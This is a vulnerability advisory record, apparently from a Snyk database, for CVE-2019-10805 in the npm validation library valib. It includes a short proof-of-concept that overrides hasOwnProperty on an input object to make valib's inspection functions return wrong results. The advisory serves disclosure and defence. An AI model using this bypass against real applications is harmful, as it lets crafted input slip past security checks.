---
- id: snykio:npm:valib:559015
  title: Internal Property Tampering
  description: |
    [valib][1] is a A standalone javascript library tailored for validation.

    Affected versions of this package are vulnerable to Internal Property
    Tampering. A maliciously crafted JavaScript object can bypass several
    inspection functions provided by `valib`. `Valib` uses a built-in
    function `(hasOwnProperty)` from the unsafe user-input to examine an
    object. It is possible for a crafted payload to overwrite this function
    to manipulate the inspection results to bypass security checks.

    ### PoC by Feng Xiao (xiaofen9)   {#poc-by-feng-xiao-xiaofen9}

        "use strict";
        var valib = require('valib');
        var json = {
            key1: null,
            key2: {
                url: "http://example.com"
            },
            key3: "17850",
            key4: "OK",
            key5: "2012-10-06T04:13:00+00:00",
            key6: [1, 2, 3],
            key7: "Yes"
        };
        json.hasOwnProperty = function(val) {return false;}
        function test(userJson){
            console.log(valib.Object.isEmpty(userJson));
            console.log(valib.Object.countKeys(userJson));
            console.log(valib.Object.hasValue(userJson, "Yes"));
        }
        test(json);



    [1]: https://www.npmjs.com/package/valib
  affected_package: valib
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cve:
  - CVE-2019-10805
  cwe:
  - CWE-642
  disclosed_date: 2020-02-28
  created_date: 2020-02-28
  last_modified_date: 2020-02-28
  credit:
  - Feng Xiao (xiaofen9)
  references:
  - https://www.npmjs.com/package/valib
  source_url: https://snyk.io/vuln/SNYK-JS-VALIB-559015
